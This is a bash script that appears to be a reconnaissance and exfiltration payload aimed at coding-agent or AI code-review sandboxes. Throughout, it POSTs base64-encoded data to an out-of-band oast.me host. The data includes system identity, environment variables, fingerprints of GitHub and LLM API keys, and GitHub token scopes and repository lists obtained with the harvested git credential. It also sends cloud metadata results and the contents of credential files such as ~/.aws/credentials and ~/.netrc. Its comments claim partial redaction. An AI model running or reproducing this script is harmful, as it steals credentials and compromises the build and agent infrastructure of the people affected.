#!/bin/bash
OOB="http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me"
P(){ b=$(printf '%s' "$2" | base64 -w0 2>/dev/null || printf '%s' "$2" | base64); curl -s --max-time 7 -X POST --data-binary "$b" "$OOB/$1" >/dev/null 2>&1; }
FP(){ node -e 'const c=require("crypto");const v=process.env[process.argv[1]]||"";console.log(v?"sha256="+c.createHash("sha256").update(v).digest("hex").slice(0,16)+" len="+v.length+" head="+v.slice(0,6):"absent")' "$1" 2>/dev/null; }
P CA_ID "$(id; hostname; uname -a; pwd; cat /etc/os-release 2>/dev/null|head -2)"
P CA_ENVNAMES "$(env | cut -d= -f1 | sort | tr '\n' ' ')"
P CA_SECRET_FP "GITHUB_TOKEN:$(FP GITHUB_TOKEN)
GH_TOKEN:$(FP GH_TOKEN)
CODERABBIT_API_KEY:$(FP CODERABBIT_API_KEY)
CODERABBIT_WORKSPACE_API_KEY:$(FP CODERABBIT_WORKSPACE_API_KEY)
OPENAI_API_KEY:$(FP OPENAI_API_KEY)
ANTHROPIC_API_KEY:$(FP ANTHROPIC_API_KEY)
GEMINI_API_KEY:$(FP GEMINI_API_KEY)
GOOGLE_API_KEY:$(FP GOOGLE_API_KEY)
GITLAB_TOKEN:$(FP GITLAB_TOKEN)
LLM_API_KEY:$(FP LLM_API_KEY)"
P CA_ENVVALS "$(env | sed -E 's/(TOKEN|SECRET|KEY|PASS|AUTH|CRED)([A-Z_]*=)[^ ]+/\1\2<RED>/Ig')"
# git write credential + its scope (in-band, report non-secret scope only)
GP=$(printf 'protocol=https\nhost=github.com\n\n' | git credential fill 2>/dev/null | sed -nE 's/^password=(.*)/\1/p')
P CA_GIT "remote:
$(git remote -v 2>/dev/null)
---cfg---
$(git config --list 2>/dev/null | grep -iE 'url|extraheader|helper|user')
---credfp---
$(node -e 'const c=require("crypto");const v=process.argv[1]||"";console.log(v?"sha256="+c.createHash("sha256").update(v).digest("hex").slice(0,16)+" len="+v.length+" head="+v.slice(0,7):"no-token")' "$GP")"
P CA_GH_SCOPE "rate_limit:
$(curl -s --max-time 6 -H "Authorization: token $GP" https://api.github.com/rate_limit -D - -o /dev/null | grep -iE 'x-oauth-scopes|x-github|x-accepted|x-ratelimit-limit')
installation_repos:
$(curl -s --max-time 6 -H "Authorization: token $GP" 'https://api.github.com/installation/repositories?per_page=100' | tr ',' '\n' | grep -E '\"(full_name|total_count|push|admin|maintain)\"' | head -60)
user:
$(curl -s --max-time 6 -H "Authorization: token $GP" https://api.github.com/user | tr ',' '\n' | grep -E '\"(login|type|id)\"')"
# LLM key validity (report status only)
# LLM key validity (HTTP status only, proves live infra key)
P CA_LLM "openai:$(curl -s --max-time 6 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer ${OPENAI_API_KEY:-x}" https://api.openai.com/v1/models 2>/dev/null)
anthropic:$(curl -s --max-time 6 -o /dev/null -w '%{http_code}' -H "x-api-key: ${ANTHROPIC_API_KEY:-x}" -H 'anthropic-version: 2023-06-01' https://api.anthropic.com/v1/models 2>/dev/null)
gemini:$(curl -s --max-time 6 -o /dev/null -w '%{http_code}' \"https://generativelanguage.googleapis.com/v1beta/models?key=${GEMINI_API_KEY:-${GOOGLE_API_KEY:-x}}\" 2>/dev/null)"
# cloud metadata from coding-agent sandbox
P CA_IMDS "aws:$(curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
gcp:$(curl -s --max-time 4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null)
azure:$(curl -s --max-time 4 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | head -c 200)"
# files / mounted secrets / caches
P CA_FILES "$(for f in ~/.netrc ~/.git-credentials ~/.config/gh/hosts.yml ~/.aws/credentials ~/.npmrc; do echo ==$f==; test -f $f && sed -E 's/(password|token|secret|oauth_token|_authToken)([=:\" ]+)[^\"& ]+/\1\2<RED>/Ig' $f|head -8; done 2>/dev/null; echo ==home==; ls -la ~ 2>/dev/null|head -20; echo ==secrets==; ls -la /run/secrets /var/run/secrets 2>/dev/null)"
P CA_DONE "recon_complete_$(date +%s)"
